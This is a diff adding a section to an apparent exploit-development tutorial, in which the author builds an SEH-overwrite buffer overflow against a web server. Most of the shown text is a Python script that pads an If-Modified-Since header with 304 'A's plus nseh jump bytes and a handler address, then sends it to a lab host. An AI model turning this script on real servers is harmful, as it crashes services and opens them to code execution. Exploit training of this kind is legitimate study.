@@ -344,6 +344,38 @@ Enter offset in decimal: 50
 [+] Positive jump opcodes: \xeb\x32
 ```
 
+Excellent, `offset.py` gives us our negative jump codes and we can put this value into `nseh`. Let's update our exploit script. Note that we added NOPs to `nseh` just to pad out the rest of the 4 byte value. 
+```python
+import socket
+import sys
+
+host = "192.168.1.201"
+port = 80
+
+seh = "\x84\xf5\x44"
+nseh = "\xeb\xcc\x90\x90"
+
+#PO @ 304
+crash = "A" * 304
+crash += nseh
+crash += seh
+
+
+req = "GET / HTTP/1.1\r\n"
+req += "Host: 192.168.1.201\r\n"
+req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
+req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+req += "Accept-Language: en-US,en;q=0.5\r\n"
+req += "Accept-Encoding: gzip, deflate\r\n"
+req += "Connection: close\r\n"
+req += "Upgrade-Insecure-Requests: 1\r\n"
+req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.send(req)
+s.close()
+```
 
 --TO BE CONTINUED--
 
